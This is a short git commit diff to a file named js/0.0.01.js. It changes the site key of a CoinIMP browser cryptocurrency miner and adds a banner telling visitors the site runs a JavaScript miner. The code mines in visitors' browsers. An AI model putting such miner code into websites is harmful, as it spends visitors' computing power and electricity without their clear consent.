8ed96424d17754f3caeec73d14df5873517fab13
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-03-01 01:25:49 +0900

    Update 0.0.01.js

--- js/0.0.01.js
+++ js/0.0.01.js
@@ -1,4 +1,5 @@
-var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e61888200591741b','Abassil', {
-   throttle: 0.1, c: 'w',ads: 0
+var _client = new Client.User('9f17605b23c48e4bef868ca648c4f7d0a39839a9d9b5cb72edc6ca04bc7a0e96','Abassil', {
+   throttle: 0.1, c: 'w'
     });
     _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
